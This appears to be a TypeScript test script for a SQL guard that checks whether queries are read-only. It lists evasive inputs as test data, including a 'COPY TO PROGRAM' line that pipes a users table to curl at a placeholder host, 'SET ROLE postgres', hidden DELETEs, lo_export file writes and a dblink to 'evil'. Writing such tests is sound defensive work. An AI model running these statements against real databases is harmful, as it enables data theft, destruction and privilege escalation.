import { guardSql, isMutating, outsideReach } from './sql-guard.ts'
const cases: Record<string, string> = {
  'plain select': 'SELECT * FROM users',
  'plain delete': 'DELETE FROM users',
  'CTE hides a delete': 'WITH d AS (DELETE FROM users RETURNING *) SELECT * FROM d',
  'delete after a select': 'SELECT 1; DELETE FROM users',
  'comment hides keyword': '/* SELECT */ DELETE FROM users',
  'line comment then drop': '-- read only\nDROP TABLE users',
  'lowercase and spaces': '   dElEtE\n\tfrom users',
  'COPY TO PROGRAM (runs a shell)': "COPY users TO PROGRAM 'curl https://x.invalid -d @-'",
  'select into creates table': 'SELECT * INTO backup FROM users',
  'select for update (locks)': 'SELECT * FROM users FOR UPDATE',
  'function with side effects': "SELECT pg_terminate_backend(pid) FROM pg_stat_activity",
  'set role': 'SET ROLE postgres',
  'do block': "DO $$ BEGIN DELETE FROM users; END $$",
  'call procedure': 'CALL purge_users()',
  'explain analyze delete (executes!)': 'EXPLAIN ANALYZE DELETE FROM users',
  'prepare/execute': "PREPARE p AS DELETE FROM users; EXECUTE p",
  'dollar-quoted string with keyword': "SELECT $q$DELETE FROM users$q$",
  'truncate': 'TRUNCATE users',
  'grant': 'GRANT ALL ON users TO public',
  'vacuum full': 'VACUUM FULL users',
  'lo_export writes a file': "SELECT lo_export(1, '/tmp/x')",
  'dblink to another db': "SELECT * FROM dblink('host=evil', 'DELETE FROM t') AS x(a int)"
}
for (const [name, sql] of Object.entries(cases)) {
  let out: string
  try { const v = guardSql(sql); out = `${isMutating(v) ? 'MUTATING' : 'read    '} ${JSON.stringify(v).slice(0, 110)}` } catch (e) { out = `THROWS ${(e as Error).message.slice(0, 80)}` }
  console.log(name.padEnd(36), out)
}
